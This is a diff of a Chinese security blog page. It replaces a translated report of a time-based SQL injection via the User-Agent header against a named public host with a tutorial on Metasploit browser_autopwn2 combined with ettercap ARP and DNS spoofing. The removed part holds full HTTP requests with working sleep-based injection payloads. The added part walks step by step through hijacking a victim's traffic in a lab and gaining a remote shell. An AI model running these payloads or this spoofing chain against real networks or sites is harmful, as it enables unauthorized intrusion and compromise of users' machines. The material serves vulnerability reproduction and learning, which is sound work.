@@ -16,11 +16,10 @@
     <link rel="dns-prefetch" href="http://yoursite.com">
     <!--SEO-->
 
-    <meta name="keywords" content="SQL注入">
+    <meta name="keywords" content="漏洞复现">
 
 
-    <meta name="description" content="本文主要讲解一个通过HTTP请求中User-Agent来实现注入的漏洞，以下为自己翻译整理我已经确认了一个SQL注入漏洞，网址是：labs.data.gov
-影响点/dashboard/data...">
+    <meta name="description" content="简介：MSF自动化浏览器攻击需要利用metasploit提供的辅助功能模块–auxiliary/server/browser_autopwn2，以及ettercap的DNS欺骗，当被DNS欺骗的...">
 
 
 
@@ -32,7 +31,7 @@
     <!--Title-->
 
 
-<title>通过user-agent实现sql注入之翻译篇 | littleStar的博客--简单有趣</title>
+<title>MSF搭配ettercap自动化浏览器攻击 | littleStar的博客--简单有趣</title>
 
 
     <link rel="alternate" href="/atom.xml" title="littleStar的博客--简单有趣" type="application/atom+xml">
@@ -141,9 +140,9 @@
                     <p id="process"></p>
 <article class="post">
     <div class="post-head">
-        <h1 id="通过user-agent实现sql注入之翻译篇">
+        <h1 id="MSF搭配ettercap自动化浏览器攻击">
             
-	            通过user-agent实现sql注入之翻译篇
+	            MSF搭配ettercap自动化浏览器攻击
             
         </h1>
         <div class="post-meta">
@@ -159,7 +158,7 @@
             <i class="fa fa-tags"></i>
             <span class="tags-meta">
                 
-                    <a class="tag-link" href="/tags/SQL注入/">SQL注入</a>
+                    <a class="tag-link" href="/tags/漏洞复现/">漏洞复现</a>
                 
             </span>
         </span>
@@ -169,7 +168,7 @@
         
         <span class="fa-wrap">
             <i class="fa fa-clock-o"></i>
-            <span class="date-meta">2019/03/24</span>
+            <span class="date-meta">2019/04/20</span>
         </span>
         
     
@@ -179,23 +178,45 @@
     </div>
     
     <div class="post-body post-content">
-        <p>本文主要讲解一个通过HTTP请求中User-Agent来实现注入的漏洞，以下为自己翻译整理<br><a id="more"></a><br>我已经确认了一个SQL注入漏洞，网址是：labs.data.gov</p>
-<p>影响点/dashboard/datagov/csv_to_json可以利用User-Agent请求头</p>
-<p>我没有从数据库提取任何数据，通过不同算术运算进行sleep SQL查询，我已经确认了此漏洞，sleep命令结合算术运算会引起服务器休眠，休眠的时间取决于算术运算的结果</p>
-<p>例如，设置UA头</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent:Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87&apos;XOR(if(now()=sysdate(),sleep(5*5),0))OR&apos;</span><br></pre></td></tr></table></figure>
-<p>会引起服务器休眠25（5*5）秒</p>
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>发送以下HTTPS请求</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /dashboard/datagov/csv_to_json HTTP/1.1</span><br><span class="line">Referer: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87&apos;XOR(if(now()=sysdate(),sleep(5*5),0))OR&apos;</span><br><span class="line">X-Forwarded-For: 1</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Host: labs.data.gov</span><br><span class="line">Connection: Keep-alive</span><br><span class="line">Accept-Encoding: gzip,deflate</span><br><span class="line">Accept: */*</span><br></pre></td></tr></table></figure>
-<p>服务器会在25s（5*5）后响应，这与User-Agent中的值一样</p>
-<p>现在，我们发送sleep (<code>5*5*0</code>) 其值为0的数据，让服务器立即响应</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /dashboard/datagov/csv_to_json HTTP/1.1</span><br><span class="line">Referer: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87&apos;XOR(if(now()=sysdate(),sleep(5*5*0),0))OR&apos;</span><br><span class="line">X-Forwarded-For: 1</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Host: labs.data.gov</span><br><span class="line">Connection: Keep-alive</span><br><span class="line">Accept-Encoding: gzip,deflate</span><br><span class="line">Accept: */*</span><br></pre></td></tr></table></figure>
-<p>因为<code>5*5*0=0</code>，所以服务器立即响应了</p>
-<p>这次用另一个请求再次确认</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /dashboard/datagov/csv_to_json HTTP/1.1</span><br><span class="line">Referer: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87&apos;XOR(if(now()=sysdate(),sleep(6*6-30),0))OR&apos;</span><br><span class="line">X-Forwarded-For: 1</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Host: labs.data.gov</span><br><span class="line">Connection: Keep-alive</span><br><span class="line">Accept-Encoding: gzip,deflate</span><br><span class="line">Accept: */*</span><br></pre></td></tr></table></figure>
-<p>payload中含有<code>6*6-30</code>，其时间等于6s，服务器同样在6秒后响应</p>
-<p>通过几个SQL查询，结合不同数学运算，我已经试着确认了这个问题</p>
-<h2 id="影响"><a href="#影响" class="headerlink" title="影响"></a>影响</h2><p>攻击者可以操纵SQL语句，发送到MYSQL数据库，注入恶意SQL语句，攻击者可以改变SQL语句的逻辑来对数据库执行恶意查询<br><img src="https://github.com/wintermoon99/forTestIMg/raw/master/img/sqli-labs-data-gov-ua-25sec.png" alt="image"><br><img src="https://github.com/wintermoon99/forTestIMg/raw/master/img/sqli-labs-data-gov-ua-9sec.png" alt="image"></p>
+        <p><strong>简介：</strong><br>MSF自动化浏览器攻击需要利用metasploit提供的辅助功能模块–auxiliary/server/browser_autopwn2，以及ettercap的DNS欺骗，当被DNS欺骗的用户打开浏览器访问网页时，会跳转到构造好的恶意页面，自动攻击用户的浏览器，并获得一个shell<br><a id="more"></a></p>
+<h2 id="一、msf部署"><a href="#一、msf部署" class="headerlink" title="一、msf部署"></a>一、msf部署</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# /etc/init.d/postgresql start</span><br><span class="line">root@kali:~# msfconsole</span><br></pre></td></tr></table></figure>
+<p>进入msf交互窗口后，输入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search browser_autopwn2</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://github.com/wintermoon99/forTestIMg/raw/master/msf_browser_autopwn2/1.png" alt="image"></p>
+<p>利用此模块<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/server/browser_autopwn2</span><br><span class="line">show options</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://github.com/wintermoon99/forTestIMg/raw/master/msf_browser_autopwn2/2.png" alt="image"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run</span><br></pre></td></tr></table></figure>
+<p>运行成功后会在最后生成一个恶意链接，这个后面会用到</p>
+<p><img src="https://github.com/wintermoon99/forTestIMg/raw/master/msf_browser_autopwn2/3.png" alt="image"></p>
+<h2 id="二、开启apache服务"><a href="#二、开启apache服务" class="headerlink" title="二、开启apache服务"></a>二、开启apache服务</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# /etc/init.d/apache2 start</span><br><span class="line">root@kali:~# cd /var/www/html</span><br><span class="line">root@kali:~# vim index.html</span><br></pre></td></tr></table></figure>
+<p>打开index.html，删除所有内容，修改为图片中的内容，保存退出</p>
+<p>此javascript代码中location.href后面跟的链接就是上一步生成的恶意链接<br><img src="https://github.com/wintermoon99/forTestIMg/raw/master/msf_browser_autopwn2/5.png" alt="image"></p>
+<h2 id="三、ettercap欺骗"><a href="#三、ettercap欺骗" class="headerlink" title="三、ettercap欺骗"></a>三、ettercap欺骗</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# cd /etc/ettercap</span><br><span class="line">root@kali:~# vim etter.dns</span><br></pre></td></tr></table></figure>
+<p>在下面添加两行记录，保存退出</p>
+<p><img src="https://github.com/wintermoon99/forTestIMg/raw/master/msf_browser_autopwn2/6.png" alt="image"></p>
+<p>开启ettercap图形化界面<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# ettercap -G</span><br></pre></td></tr></table></figure></p>
+<p>第一步：点击Unifiled sniffing</p>
+<p><img src="https://github.com/wintermoon99/forTestIMg/raw/master/msf_browser_autopwn2/7.png" alt="image"></p>
+<p>第二步：先扫描存活主机，然后列举出扫描到的存活主机</p>
+<p><img src="https://github.com/wintermoon99/forTestIMg/raw/master/msf_browser_autopwn2/8.png" alt="image"></p>
+<p>第三步：添加网关ip到target1，添加被攻击机ip到target2</p>
+<p><img src="https://github.com/wintermoon99/forTestIMg/raw/master/msf_browser_autopwn2/10.png" alt="image"></p>
+<p>如果不知道网关ip，linux可以输入以下命令查看网关</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># route -n</span><br></pre></td></tr></table></figure>
+<p><img src="https://github.com/wintermoon99/forTestIMg/raw/master/msf_browser_autopwn2/16.png" alt="image"></p>
+<p>第四步：点击ARP欺骗</p>
+<p><img src="https://github.com/wintermoon99/forTestIMg/raw/master/msf_browser_autopwn2/11.png" alt="image"></p>
+<p>然后勾选第一个</p>
+<p><img src="https://github.com/wintermoon99/forTestIMg/raw/master/msf_browser_autopwn2/12.png" alt="image"></p>
+<p>第五步：管理插件</p>
+<p><img src="https://github.com/wintermoon99/forTestIMg/raw/master/msf_browser_autopwn2/13.png" alt="image"></p>
+<p>启用dns欺骗</p>
+<p><img src="https://github.com/wintermoon99/forTestIMg/raw/master/msf_browser_autopwn2/14.png" alt="image"></p>
+<p>第六步：开始欺骗</p>
+<p><img src="https://github.com/wintermoon99/forTestIMg/raw/master/msf_browser_autopwn2/15.png" alt="image"></p>
+<h2 id="四、获取shell"><a href="#四、获取shell" class="headerlink" title="四、获取shell"></a>四、获取shell</h2><p>这里用的是xp虚拟机作为被攻击的机器，打开xp的浏览器，输入任意网址，比如 <a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a> ，会自动跳转到我们刚才构造的恶意页面，自动化攻击浏览器</p>
+<p><img src="https://github.com/wintermoon99/forTestIMg/raw/master/msf_browser_autopwn2/17.png" alt="image"></p>
+<p>此时回到kali中msfconsole交互窗口，发现已经攻击成功，获得了xp的shell</p>
+<p><img src="https://github.com/wintermoon99/forTestIMg/raw/master/msf_browser_autopwn2/18.png" alt="image"></p>
 
     </div>
     
@@ -213,15 +234,10 @@
 
 <div class="article-nav prev-next-wrap clearfix">
     
-        <a href="/2019/04/20/msf浏览器自动化攻击/" class="pre-post btn btn-default" title="MSF搭配ettercap自动化浏览器攻击">
-            <i class="fa fa-angle-left fa-fw"></i><span class="hidden-lg">上一篇</span>
-            <span class="hidden-xs">MSF搭配ettercap自动化浏览器攻击</span>
-        </a>
     
-    
-        <a href="/2019/03/18/hexo_github/" class="next-post btn btn-default" title="利用hexo+github搭建博客">
+        <a href="/2019/03/24/通过user-agent实现sql注入之翻译篇/" class="next-post btn btn-default" title="通过user-agent实现sql注入之翻译篇">
             <span class="hidden-lg">下一篇</span>
-            <span class="hidden-xs">利用hexo+github搭建博客</span><i class="fa fa-angle-right fa-fw"></i>
+            <span class="hidden-xs">通过user-agent实现sql注入之翻译篇</span><i class="fa fa-angle-right fa-fw"></i>
         </a>
     
 </div>
@@ -264,7 +280,7 @@
     <div class="widget">
         <h3 class="title">Table of Contents</h3>
         
-            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞复现"><span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#影响"><span class="toc-text">影响</span></a></li></ol>
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#一、msf部署"><span class="toc-text">一、msf部署</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#二、开启apache服务"><span class="toc-text">二、开启apache服务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#三、ettercap欺骗"><span class="toc-text">三、ettercap欺骗</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#四、获取shell"><span class="toc-text">四、获取shell</span></a></li></ol>
         
     </div>
 </aside>
